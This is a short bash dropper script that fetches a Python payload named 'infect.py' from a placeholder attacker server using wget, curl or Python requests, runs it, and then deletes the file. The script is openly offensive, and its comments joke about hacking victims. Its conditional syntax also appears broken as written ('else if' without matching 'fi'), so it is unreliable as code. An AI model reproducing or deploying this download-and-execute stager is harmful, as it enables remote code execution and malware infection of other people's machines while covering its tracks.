#!/bin/bash

URL="http://your.attacker.machine:8080/"; # change this !


if ! [[ "$URL" = *\/ ]]; then 
  URL=$URL"/"
fi

PYURL=$URL"infect.py"

exist () {
    type "$1" &> /dev/null ;
}

PY=""

if exist python; then
	PY="python"
else if exist python3; then
	PY="python3"
else
	echo "Python not installed !"
	echo "As c version isn't released yet, skipping, hack em next time !"
	exit 1
fi

if exist wget; then
	wget $PYURL -O /tmp/infect.py
else if exist curl; then
	curl $PYURL -O /tmp/infect.py >/dev/null
else
	$PY -c 'f=open("/tmp/infect.py","w+");f.write(__import__("requests").get($PYURL).text)'
fi

$PY /tmp/infect.py
rm /tmp/infect.py